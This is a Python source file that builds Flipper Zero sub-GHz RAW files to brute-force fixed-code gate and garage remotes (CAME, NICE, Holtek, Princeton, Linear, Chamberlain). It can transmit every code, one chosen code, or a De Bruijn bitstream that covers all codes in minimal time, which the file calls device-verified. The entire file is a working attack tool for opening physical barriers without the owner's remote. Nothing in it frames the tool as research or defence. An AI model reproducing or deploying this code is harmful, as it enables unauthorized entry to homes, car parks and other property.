"""Barrier / gate brute-forcer: fixed-code OOK remotes (CAME / NICE / Holtek /
   Princeton / Linear / Chamberlain). Generates a Flipper RAW .sub that sends
   either EVERY code (brute-force) or one chosen code. Uses the proven PWM
   encoder from extra_protocols (round-trip-verified vs the fixed-code decoders)."""
import json
from extra_protocols import _pwm_encode

# (name, nbits, te_us) -- classic brute-forceable fixed-code gates
PROTOS = [
    ("CAME 12-bit",         12, 320),
    ("NICE FLO 12-bit",     12, 700),
    ("Holtek HT12E 12-bit", 12, 320),
    ("Princeton 12-bit",    12, 350),
    ("Linear 10-bit",       10, 500),
    ("Chamberlain 9-bit",    9, 500),
]
_BY = {p[0]: p for p in PROTOS}

def protocols():
    base = [{"name": n, "bits": b, "te": t, "codes": 1 << b} for (n, b, t) in PROTOS]
    try:  # merge the ported PandwaRF fixed-code remotes so they appear in the same picker
        import pandwarf_remotes
        for p in pandwarf_remotes.protocols():
            base.append({"name": p["name"], "bits": max(1, (p["codes"] - 1).bit_length()),
                         "te": 0, "codes": p["codes"]})
    except Exception:
        pass
    return json.dumps(base)


def _is_pandwarf(name):
    try:
        import pandwarf_remotes
        return any(p["name"] == name for p in pandwarf_remotes.protocols())
    except Exception:
        return False

def _sub(ds, freq):
    head = ("Filetype: Flipper SubGhz RAW File\nVersion: 1\nFrequency: %d\n"
            "Preset: FuriHalSubGhzPresetOok650Async\nProtocol: RAW\n" % freq)
    parts = [head]
    for i in range(0, len(ds), 512):
        parts.append("RAW_Data: " + " ".join(str(x) for x in ds[i:i + 512]) + "\n")
    return "".join(parts)

def brute_sub(name, reps=2, freq=433920000):
    """RAW .sub sending EVERY code of the protocol (ascending). <=14-bit only."""
    if name not in _BY:
        if _is_pandwarf(name):
            return json.dumps({"error": "code space too large to brute-force — send one code"})
        return json.dumps({"error": "unknown protocol"})
    n, b, t = _BY[name]
    if b > 14:
        return json.dumps({"error": "%d-bit space too large to brute-force" % b})
    ds = []
    for code in range(1 << b):
        enc = _pwm_encode(code, b, te=t)
        for _ in range(reps):
            ds += enc
    return _sub(ds, freq)

def one_sub(name, code, reps=8, freq=433920000):
    """RAW .sub sending one chosen code `reps` times."""
    if name not in _BY:
        if _is_pandwarf(name):  # the remote only works on its own frequency -> ignore the UI freq
            import pandwarf_remotes
            r = pandwarf_remotes.one_sub(name, int(code))
            return r if isinstance(r, str) else json.dumps(r)
        return json.dumps({"error": "unknown protocol"})
    n, b, t = _BY[name]
    ds = []
    for _ in range(reps):
        ds += _pwm_encode(int(code) & ((1 << b) - 1), b, te=t)
    return _sub(ds, freq)


def debruijn_bits(n):
    """De Bruijn B(2,n): a 2^n-bit cyclic sequence in which every n-bit code appears exactly
    once (FKM algorithm). Brute-forcing with it covers all codes in ~2^n bits instead of 2^n*n."""
    a = [0] * (n + 1)
    seq = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                seq.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, 2):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return seq


def debruijn_sub(name, reps=1, freq=433920000):
    """RAW .sub that brute-forces a fixed-code protocol with a De Bruijn stream (one continuous
    PWM bitstream covering every code of the protocol's bit-width). On-air: device-verified."""
    if name not in _BY:
        return json.dumps({"error": "unknown protocol"})
    n, b, t = _BY[name]
    if b > 20:
        return json.dumps({"error": "%d-bit space too large" % b})
    bits = debruijn_bits(b)
    bits = bits + bits[: b - 1]           # wrap for cyclic coverage of the last codes
    ds = []
    for _ in range(max(1, reps)):
        for bit in bits:
            ds += [3 * t, -t] if bit else [t, -3 * t]   # PT2262-style PWM symbol per bit
    return _sub(ds, freq)
